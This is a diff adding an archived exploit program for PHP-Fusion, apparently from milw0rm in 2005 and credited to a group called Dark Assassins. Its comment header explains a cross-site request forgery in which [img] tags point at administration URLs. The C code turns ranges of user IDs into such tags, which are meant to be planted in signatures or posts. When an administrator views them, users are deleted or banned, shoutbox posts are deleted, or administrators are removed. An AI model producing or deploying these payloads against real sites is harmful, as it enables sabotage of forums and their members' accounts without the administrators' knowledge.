@@ -1,0 +1,130 @@
+/* 
+
+ahh I was hoping for some socket code :( /str0ke
+
+Dark Assassins - http://dark-assassins.com/
+Visit us on IRC @ irc.tddirc.net #DarkAssassins
+
+PHP-Fusion [img][/img] exploit
+
+Discovered/Coded by Easyex
+
+Using the [img] [/img] codes we can get an administrator to do a function a normal member cannot do.
+
+For example..
+
+[img]/administration/members.php?step=delete&sortby=all&rowstart=0&user_id=1[/img]
+
+This could be in our signature, forum post or in a comment post. When an admin views the page with the malicious code it will automatically load and do the function we selected. In the example it would delete the shout box post with the id 1.
+
+Because we are using the [img] [/img] code it just shows up as an invalid image.
+
+Code usage:
+
+./fusionimg <version> <dir> deluser <start> <end>
+./fusionimg <version> <dir> banuser <start> <end>
+./fusionimg <version> <dir> delshout <start end>
+./fusionimg <version> <dir> deladmin <start end>
+
+<version> is the PHP-Fusion version. enter 6.x or 5.x depending on the version number.
+
+<start> is the start point of user id(s)
+<end> is the end point of the user id(s)
+ 
+So if we had a vulnerable host running PHP Fusion v6.00.106 or below with say 150 users and we wanted to delete them all we would type ./fusionimg 6.x / deluser 1 150 or if we wanted to delete 1 user that had the id: 5 we would type: ./fusionimg 6.x / deluser 5 5
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+   int usage() {
+      printf("Usage: ./fusionimg <version> <dir> <option> <start> <end>\n");
+      printf("Example: ./fusionimg 6.x / deluser 1 500\n");
+      exit(1);
+   }
+
+   int main (int argc, char *argv[]) {
+   
+   printf("\n");
+   printf("PHP-Fusion [img][/img] exploit\n");
+   printf("Coded by Easyex from the Dark Assassins crew\n\n");
+   
+   if(argc < 6 )
+      usage();
+          
+   int i;
+   char cmd[512];
+   char option[512];
+   char version[512];    
+   
+   FILE *log;
+   log = fopen("exploit.txt", "w+");
+
+   if(log == 0) {
+      printf("[-] Error opening log file.\n");
+      exit(-1);;              
+   }
+   
+   fprintf(log, "PHP-Fusion [img][/img] exploit\n");
+   fprintf(log, "Discovered/Coded by Easyex\n\n");
+   
+   if(strcmp(argv[1], "6.x") == 0) {
+      strncpy(version, "administration/", 512);
+   }
+ 
+   else if(strcmp(argv[1], "5.x") == 0) {
+      strncpy(version, "fusion_admin/", 512);
+   }
+   
+   else {
+      printf("[-] Error, Invalid version!\n");
+      exit(-1);;
+   }      
+   
+   // There are other options you can do, This is just some of them...
+   
+   // If you need to find out a users id you can just go to members.php and click on the user you want and the id will show in the url like ?lookup=1     
+      
+   if(strcmp(argv[3], "deluser") == 0) {
+      strncpy(option, "members.php?step=delete&sortby=all&rowstart=0&user_id=", 512);
+      fprintf(log, "You have selected to delete %s > %s user(s)\n", argv[4], argv[5]);
+   }
+    
+   else if(strcmp(argv[3], "banuser") == 0) {
+      strncpy(option, "members.php?step=ban&act=on&sortby=all&rowstart=0&user_id=", 512);
+      fprintf(log, "You have selected to ban %s > %s user(s)\n", argv[4], argv[5]);
+   }
+
+   else if(strcmp(argv[3], "delshout") == 0) {
+      strncpy(option, "shoutbox.php?action=delete&shout_id=", 512);
+      fprintf(log, "You have selected to delete %s > %s shoutbox post(s)\n", argv[4], argv[5]);
+   }
+
+   // We can delete any account, But we cant add admin accounts
+      
+   else if(strcmp(argv[3], "deladmin") == 0) {
+      strncpy(option, "administrators.php?remove=", 512);
+      fprintf(log, "You have selected to delete %s > %s administator(s)\n", argv[4], argv[5]);
+   }   
+      
+   else {
+      printf("[-] Error, Invalid option!\n");
+      exit(-1);
+   }
+      
+   printf("[+] Generating image codes...\n\n");
+   
+   fprintf(log, "Add the following lines of code into your signature, forum post or in a comment post:\n\n");
+       
+   for (i = atoi(argv[4]); i <= atoi(argv[5]); i++) {
+      sprintf(cmd, "[img]%s%s%s%d[/img]", argv[2], version, option, i);
+      fprintf(log, "%s\n", cmd);
+   }
+   
+   printf("[+] Completed & logged to exploit.txt\n");
+   exit(1);   
+}
+
+// milw0rm.com [2005-08-05]
